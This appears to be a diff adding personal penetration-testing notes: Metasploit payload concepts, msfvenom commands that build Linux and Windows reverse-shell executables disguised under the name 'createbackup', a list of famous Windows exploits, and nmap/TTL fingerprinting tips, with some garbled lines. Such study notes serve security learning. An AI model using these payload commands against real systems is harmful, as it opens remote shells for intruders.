@@ -68,3 +68,69 @@
 
 
 ```
+
+<br>
+
+### Metasploit - Automating Payloads and Delivery
+```
+# Payload is the intended message, which in Cybersecurity is the code that exploits a systems vulnerabilities
+```
+
+<br>
+
+### msfvenom 
+```
+# Staged Payloads send over small stages that establish a connection that will then send over more information. A downside to this can be too much memory taken up.
+linux/x86/shell/reverse_tcp
+
+# Stageless Payloads send over everything at once and dont setup and stages before hand. Downsides to this are unstable shells 
+linux/zarch/meterpreter_reverse_tcp
+
+# Building a stageless payload with msfvenom 
+  1. msfvenom -p linux/x64/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f elf > createbackup.elf
+    a. -p tell msfvenom to create a payload 
+
+  2. msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=[port] -f exe > createbackup.exe
+```
+
+<br> 
+
+
+### Infiltrating Windows 
+```
+# Windows Attack Surface: https://www.cvedetails.com/vendor/26/Microsoft.html
+
+
+# Popular Exploits: 
+  1. MS08-067
+  2. Eternal Blue
+  3. PrintNightmare
+  4. Bluekeep 
+  5. Sigred
+  6. SeriousSam
+  7. Zerologon
+
+
+# Determine if a machine is Windows 
+  1. TTL == 128 if 128/33 if its windows | 64 if linux | AIX/Solaris is 254 
+    a. Detailed list: https://subinsb.com/default-device-ttl-values/
+
+  2. nmap os detection using "-O" option and high verbosity 
+
+  3. nmap banner.nse script to pull banner information from any open ports 
+    sudo nmap -v 192.168.86.39 --script banner.nse
+
+
+# Batch Files, DLLs, and MSI files 
+  1. DLLs - Dynamically Linked Libraries provide shared code and data to many different programs at once.
+
+  2. Batch Files - Text Based DOS Scripts used by admins to complete tasks. 
+
+  3. VBScript - Visual Basic Script used for client side scripting
+
+  4. MSI - Install database for Windows Installer
+
+  5. Powershell - Dynamic Langugage based on the .NET Common Language Runtime
+
+
+```
